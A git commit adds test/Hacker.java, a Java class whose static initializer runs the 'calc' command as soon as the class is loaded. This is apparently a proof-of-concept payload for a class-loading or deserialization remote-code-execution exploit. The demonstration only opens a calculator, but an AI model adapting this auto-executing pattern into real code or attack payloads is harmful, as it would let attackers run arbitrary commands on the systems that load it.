7a53659ef05127072252d47dfabe47401f5a43df
Jack Blank <81026825+GitHubUser1024@users.noreply.github.com>
2021-12-29 20:43:18 +0800

    Add files via upload

---
+++ test/Hacker.java
@@ -0,0 +1,9 @@
+public class Hacker {
+    static {
+        try {
+            String[] cmd = {"calc"};
+            Runtime.getRuntime().exec(cmd).waitFor();
+        } catch (Exception e) {
+        }
+    }
+}
